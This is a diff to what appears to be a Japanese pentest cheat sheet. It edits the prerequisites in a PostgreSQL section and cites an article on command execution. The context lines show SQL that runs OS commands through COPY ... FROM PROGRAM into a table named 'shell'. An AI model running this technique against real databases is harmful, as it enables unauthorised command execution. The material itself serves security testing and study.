@@ -258,9 +258,9 @@ or
 #### PostgreSQL
 
 - 前提条件：
-	- 実行するユーザーがDBのadminであること(実際のrootとは異なる)
+	- 実行するユーザーがDBのadminであること(デフォルトではpostgres)
 	- PostgreSQL のバージョンが9.3以降であること
-	- 参考記事🔗：[Command Execution with PostgreSQL Copy Command](https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767)）
+	- 参考記事：[Command Execution with PostgreSQL Copy Command](https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767)
 ```sql
 CREATE TABLE shell(output text);
 COPY shell FROM PROGRAM '<コマンド>';
